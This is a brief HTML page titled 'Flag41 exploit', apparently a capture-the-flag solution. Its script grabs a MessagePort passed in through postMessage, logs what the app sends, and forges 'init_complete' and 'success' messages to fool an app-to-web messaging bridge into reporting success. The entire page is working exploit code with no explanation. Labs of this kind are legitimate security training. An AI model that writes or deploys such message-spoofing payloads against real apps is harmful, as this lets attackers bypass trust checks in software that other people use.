<!doctype html>
<html>
<body>
<h3>Flag41 exploit</h3>

<script>
window.addEventListener("message", function (event) {
  if (!event.ports || event.ports.length === 0) return;

  const port = event.ports[0];

  port.onmessage = function(e) {
    console.log("[app->web]", e.data);
  };

  // finish handshake
  port.postMessage(JSON.stringify({ message: "init_complete" }));

  // trigger success
  setTimeout(() => {
    port.postMessage(JSON.stringify({ message: "success" }));
  }, 1000);
});
</script>
</body>
</html>
